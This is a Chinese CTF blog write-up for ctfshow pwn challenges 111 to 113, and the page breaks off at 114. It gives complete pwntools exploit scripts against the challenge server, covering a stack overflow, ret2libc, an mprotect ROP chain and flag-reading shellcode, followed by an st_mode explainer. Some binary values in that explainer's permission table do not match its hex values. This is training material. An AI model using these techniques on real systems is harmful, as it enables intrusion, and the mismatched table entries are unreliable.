<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn111-134bypass安全机制 | zx's Blog</title><meta name="author" content="zx"><meta name="copyright" content="zx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x04 bypass安全机制pwn111 只开了nx，简单的栈溢出，连图都懒得截了，相信都到这里了，写出这玩意不是问题。 123456789101112from pwn import *context(arch&#x3D;&#x27;amd64&#x27;,os&#x3D;&#x27;linux&#x27;,log_level&#x3D;&#x27;debug&#x27;)p &#x3D; remote(&quot;pwn.chall">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn111-134bypass安全机制">
<meta property="og:url" content="https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/index.html">
<meta property="og:site_name" content="zx&#39;s Blog">
<meta property="og:description" content="0x04 bypass安全机制pwn111 只开了nx，简单的栈溢出，连图都懒得截了，相信都到这里了，写出这玩意不是问题。 123456789101112from pwn import *context(arch&#x3D;&#x27;amd64&#x27;,os&#x3D;&#x27;linux&#x27;,log_level&#x3D;&#x27;debug&#x27;)p &#x3D; remote(&quot;pwn.chall">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zx2023qj.github.io/img/3.jpg">
<meta property="article:published_time" content="2024-09-20T10:08:49.000Z">
<meta property="article:modified_time" content="2024-09-20T10:15:02.118Z">
<meta property="article:author" content="zx">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zx2023qj.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/3.jpg"><link rel="canonical" href="https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn111-134bypass安全机制',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-20 18:15:02'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/3.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zx's Blog"><span class="site-name">zx's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn111-134bypass安全机制</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-20T10:08:49.000Z" title="发表于 2024-09-20 18:08:49">2024-09-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-20T10:15:02.118Z" title="更新于 2024-09-20 18:15:02">2024-09-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn111-134bypass安全机制"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="0x04-bypass安全机制"><a href="#0x04-bypass安全机制" class="headerlink" title="0x04 bypass安全机制"></a>0x04 bypass安全机制</h3><h4 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240907153408600.png" alt="image-20240907153408600"></p>
<p>只开了nx，简单的栈溢出，连图都懒得截了，相信都到这里了，写出这玩意不是问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28214)</span><br><span class="line">elf = ELF(&#x27;../pwn111&#x27;)</span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[&#x27;do_global&#x27;]</span><br><span class="line">offset = 0x80 + 0x8</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn112"><a href="#pwn112" class="headerlink" title="pwn112"></a>pwn112</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240907160600376.png" alt="image-20240907160600376"></p>
<p>啊哈，保护全开（除了relro），32位。</p>
<p>分析一下程序就好了，后门函数在ctfshow函数的register_tm()中，只要满足var[13]&#x3D;’17’就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28257)</span><br><span class="line">elf = ELF(&#x27;../pwn112&#x27;)</span><br><span class="line"></span><br><span class="line">payload = p32(17) * 14</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn113"><a href="#pwn113" class="headerlink" title="pwn113"></a>pwn113</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240907163357020.png" alt="image-20240907163357020"></p>
<p>开启了relro，nx的64位程序</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240907174544062.png" alt="image-20240907174544062"></p>
<p>主函数长这样，漏洞应该是在while函数上，没有限定读取的字符串的长度，就会导致栈溢出。(这里需要注意，由于v5,v6,v7,v8是连在一起的，溢出的时候就会修改到v6,v7,v8，就可能导致栈溢出的失败，所以在溢出的时候需要微操一下)</p>
<p>看看官方的解法，随便输入一个不存在的文件名，然后跳转到set_secommp()函数，然后orw获得flag</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240907223255998.png" alt="image-20240907223255998"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28145)</span><br><span class="line">elf = ELF(&#x27;../pwn113&#x27;)</span><br><span class="line"></span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">pop_rdi = 0x401ba3</span><br><span class="line"></span><br><span class="line"># 仔细观察的可以发现，v3 = v6 = v8，所以溢出时只需要注意v8就好了</span><br><span class="line">offset = 0x420 - 0x8</span><br><span class="line">payload = cyclic(offset) + p8(0x28)</span><br><span class="line"></span><br><span class="line"># 此处v8 = 0x418，而我们要做的是将返回地址进行修改，此时只需要将v8修改为0x428即可（如下图所示），这个是测试的payload。</span><br><span class="line">#payload += p8(0x28) + p64(main)</span><br><span class="line"></span><br><span class="line"># ret2libc</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt; &#x27;,payload)</span><br><span class="line">puts = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:] + b&#x27;\x00\x00&#x27;)</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">gets = libc.dump(&#x27;gets&#x27;) + libc_base</span><br><span class="line">mprotect = libc.dump(&#x27;mprotect&#x27;) + libc_base</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x418) + p8(0x28)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.bss())</span><br><span class="line">payload += p64(gets)</span><br><span class="line"># 输入mprotect的第一个参数，由于需要进行页对齐，所以&amp;了一下</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.bss() &amp; 0xfffffffffffff000)</span><br><span class="line"># libc_base + 0x23e6a就是pop_rsi;ret</span><br><span class="line">payload += p64(libc_base + 0x23e6a) + p64(0x1000)</span><br><span class="line"># libc_base + 0x1b96就是pop_rdx;ret</span><br><span class="line">payload += p64(libc_base + 0x1b96) + p64(7)</span><br><span class="line">payload += p64(mprotect) + p64(elf.bss())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt; &#x27;,payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(&#x27;/flag&#x27;))</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240908222552351.png" alt="image-20240908222552351"></p>
<h5 id="万能gadget-csu"><a href="#万能gadget-csu" class="headerlink" title="万能gadget(csu)"></a>万能gadget(csu)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + 0x2155f</span><br><span class="line">pop_rsi = libc_base + 0x23e6a</span><br><span class="line">pop_rdx = libc_base + 0x1b96</span><br><span class="line">pop_rax = libc_base + 0x439c</span><br></pre></td></tr></table></figure>

<h5 id="st-mode知识补充"><a href="#st-mode知识补充" class="headerlink" title="st_mode知识补充"></a>st_mode知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">`st_mode` 是 `struct stat` 结构体中的一个成员，表示文件的类型和权限。这个结构体通过系统调用 `stat()`、`fstat()` 或 `lstat()` 来获取文件的详细状态信息。`st_mode` 是一个非常重要的字段，因为它同时包含了文件的类型和权限信息。</span><br><span class="line"></span><br><span class="line">### `struct stat` 结构体</span><br><span class="line">在 POSIX 系统（如 Linux）中，`stat` 系统调用用于获取文件的元数据信息，`st_mode` 就是其中的一个成员。`struct stat` 的定义如下：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">struct stat &#123;</span><br><span class="line">    dev_t     st_dev;         /* 文件的设备 ID */</span><br><span class="line">    ino_t     st_ino;         /* 文件的 inode 号 */</span><br><span class="line">    mode_t    st_mode;        /* 文件的类型和权限 */</span><br><span class="line">    nlink_t   st_nlink;       /* 文件的硬链接数 */</span><br><span class="line">    uid_t     st_uid;         /* 文件所有者的用户 ID */</span><br><span class="line">    gid_t     st_gid;         /* 文件所有者的组 ID */</span><br><span class="line">    dev_t     st_rdev;        /* 设备文件的设备 ID */</span><br><span class="line">    off_t     st_size;        /* 文件的总大小（以字节为单位） */</span><br><span class="line">    blksize_t st_blksize;     /* 文件系统 I/O 的块大小 */</span><br><span class="line">    blkcnt_t  st_blocks;      /* 文件所占的块数 */</span><br><span class="line">    time_t    st_atime;       /* 文件上次访问时间 */</span><br><span class="line">    time_t    st_mtime;       /* 文件内容上次修改时间 */</span><br><span class="line">    time_t    st_ctime;       /* 文件元数据（权限、所有者等）上次更改时间 */</span><br><span class="line">&#125;;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### `st_mode` 详细解释</span><br><span class="line">`st_mode` 是一个类型为 `mode_t` 的字段，用来描述文件的类型和权限。它的二进制值是一个位掩码，可以通过按位与操作来提取文件的类型或权限信息。</span><br><span class="line"></span><br><span class="line">`st_mode` 的值可以分为两部分：</span><br><span class="line">1. **文件类型（高 4 位）**：标识文件是目录、普通文件、符号链接等。</span><br><span class="line">2. **文件权限（低 9 位）**：标识文件所有者、组用户和其他用户的读、写、执行权限。</span><br><span class="line"></span><br><span class="line">#### 文件类型</span><br><span class="line">`st_mode` 的高 4 位用于表示文件的类型。常见的文件类型及其对应的值如下：</span><br><span class="line"></span><br><span class="line">| 文件类型         | 宏定义                | 十六进制值 (`st_mode`) | 说明                      |</span><br><span class="line">|-----------------|----------------------|-----------------------|--------------------------|</span><br><span class="line">| 普通文件         | `S_IFREG`            | `0x8000`              | Regular file             |</span><br><span class="line">| 目录            | `S_IFDIR`            | `0x4000`              | Directory                |</span><br><span class="line">| 符号链接         | `S_IFLNK`            | `0xA000`              | Symbolic link            |</span><br><span class="line">| 块设备文件       | `S_IFBLK`            | `0x6000`              | Block device             |</span><br><span class="line">| 字符设备文件     | `S_IFCHR`            | `0x2000`              | Character device         |</span><br><span class="line">| FIFO/管道        | `S_IFIFO`            | `0x1000`              | FIFO (named pipe)        |</span><br><span class="line">| 套接字           | `S_IFSOCK`           | `0xC000`              | Socket                   |</span><br><span class="line"></span><br><span class="line">使用掩码 `S_IFMT`（`0xF000`）可以提取出文件的类型：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">(st_mode &amp; S_IFMT) == S_IFREG   // 判断是否是普通文件</span><br><span class="line">(st_mode &amp; S_IFMT) == S_IFDIR   // 判断是否是目录</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">#### 文件权限</span><br><span class="line">`st_mode` 的低 9 位用于表示文件的权限，分为三组：文件所有者、文件所属组、其他用户。这 9 位权限分为三个部分，每个部分 3 位，分别表示：</span><br><span class="line">- **r**：可读（Read） = `4`</span><br><span class="line">- **w**：可写（Write） = `2`</span><br><span class="line">- **x**：可执行（Execute） = `1`</span><br><span class="line"></span><br><span class="line">每个权限组的结构如下：</span><br><span class="line"></span><br><span class="line">| 权限位 | 权限值 | 说明                            |</span><br><span class="line">|-------|-------|--------------------------------|</span><br><span class="line">| `rwx` | `7`   | 可读、可写、可执行（`4+2+1`）    |</span><br><span class="line">| `rw-` | `6`   | 可读、可写，不可执行（`4+2`）   |</span><br><span class="line">| `r-x` | `5`   | 可读、不可写、可执行（`4+1`）   |</span><br><span class="line">| `r--` | `4`   | 只有读权限（`4`）               |</span><br><span class="line">| `-wx` | `3`   | 没有读权限，只有写和执行权限（`2+1`） |</span><br><span class="line"></span><br><span class="line">这 9 位权限分成三组，每组对应文件所有者、文件所属组和其他用户的权限。</span><br><span class="line"></span><br><span class="line">- **文件所有者权限（Owner）：** `st_mode &amp; S_IRWXU`</span><br><span class="line">- **文件所属组权限（Group）：** `st_mode &amp; S_IRWXG`</span><br><span class="line">- **其他用户权限（Others）：** `st_mode &amp; S_IRWXO`</span><br><span class="line"></span><br><span class="line">每组权限都有以下位掩码：</span><br><span class="line"></span><br><span class="line">| 宏定义    | 二进制值 | 十六进制值 | 权限说明       |</span><br><span class="line">|----------|---------|-----------|---------------|</span><br><span class="line">| `S_IRUSR`| `000100000` | `0x0100` | 文件所有者的读权限 |</span><br><span class="line">| `S_IWUSR`| `000010000` | `0x0080` | 文件所有者的写权限 |</span><br><span class="line">| `S_IXUSR`| `000001000` | `0x0040` | 文件所有者的执行权限 |</span><br><span class="line">| `S_IRGRP`| `000000100` | `0x0020` | 文件组的读权限     |</span><br><span class="line">| `S_IWGRP`| `000000010` | `0x0010` | 文件组的写权限     |</span><br><span class="line">| `S_IXGRP`| `000000001` | `0x0008` | 文件组的执行权限   |</span><br><span class="line">| `S_IROTH`| `000000100` | `0x0004` | 其他用户的读权限   |</span><br><span class="line">| `S_IWOTH`| `000000010` | `0x0002` | 其他用户的写权限   |</span><br><span class="line">| `S_IXOTH`| `000000001` | `0x0001` | 其他用户的执行权限 |</span><br><span class="line"></span><br><span class="line">#### 特殊权限位</span><br><span class="line">除了标准的读、写、执行权限，`st_mode` 还包含一些特殊权限位：</span><br><span class="line"></span><br><span class="line">| 宏定义       | 十六进制值  | 说明                                |</span><br><span class="line">|--------------|------------|-------------------------------------|</span><br><span class="line">| `S_ISUID`    | `0x0800`   | Set user ID (文件执行时设置用户 ID)  |</span><br><span class="line">| `S_ISGID`    | `0x0400`   | Set group ID (文件执行时设置组 ID)   |</span><br><span class="line">| `S_ISVTX`    | `0x0200`   | Sticky bit (仅允许文件所有者删除文件)|</span><br><span class="line"></span><br><span class="line">### 提取文件类型与权限</span><br><span class="line">通过位运算可以提取 `st_mode` 中的文件类型和权限。</span><br><span class="line"></span><br><span class="line">#### 提取文件类型：</span><br><span class="line">```c</span><br><span class="line">if ((v3.st_mode &amp; S_IFMT) == S_IFREG) &#123;</span><br><span class="line">    printf(&quot;This is a regular file.\n&quot;);</span><br><span class="line">&#125; else if ((v3.st_mode &amp; S_IFMT) == S_IFDIR) &#123;</span><br><span class="line">    printf(&quot;This is a directory.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">#### 提取文件权限：</span><br><span class="line">```c</span><br><span class="line">// 检查文件所有者是否有读权限</span><br><span class="line">if (v3.st_mode &amp; S_IRUSR) &#123;</span><br><span class="line">    printf(&quot;Owner has read permission.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查文件是否可执行</span><br><span class="line">if (v3.st_mode &amp; S_IXUSR) &#123;</span><br><span class="line">    printf(&quot;Owner can execute the file.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 示例：</span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    struct stat fileStat;</span><br><span class="line">    if (stat(&quot;example.txt&quot;, &amp;fileStat) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;stat&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取文件类型</span><br><span class="line">    if ((fileStat.st_mode &amp; S_IFMT) == S_IFREG) &#123;</span><br><span class="line">        printf(&quot;This is a regular file.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取权限</span><br><span class="line">    if (fileStat.st_mode &amp; S_IRUSR) &#123;</span><br><span class="line">        printf(&quot;Owner has read permission.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (fileStat.st_mode &amp; S_IWUSR) &#123;</span><br><span class="line">        printf(&quot;Owner has write permission.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (fileStat.st_mode &amp; S_IXUSR) &#123;</span><br><span class="line">        printf(&quot;Owner has execute permission.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 总结：</span><br><span class="line">- **`st_mode`** 是 `struct stat` 结构体中的一个字段，包含了文件的类型和权限信息。</span><br><span class="line">- 文件类型由高 4 位表示（使用掩码 `S_IFMT` 提取），如普通文件、目录、符号链接等。</span><br><span class="line">- 文件权限由低 9 位表示，分为文件所有者、文件组和其他用户的读、写、执行权限。</span><br></pre></td></tr></table></figure>

<p>总结一下，这道题感觉主要学到的知识点还是万能gadget吧，至于ret2libc和orw这些都是之前学过的，顶多算重温一下，而且最近的题目代码量越来越大了，显然也有增强分析能力的目的。</p>
<p>先下班，明天又是周一了，明天再来。</p>
<h4 id="pwn114"><a href="#pwn114" class="headerlink" title="pwn114"></a>pwn114</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909090931060.png" alt="image-20240909090931060"></p>
<p>64位，relro为full，开启了nx和pie</p>
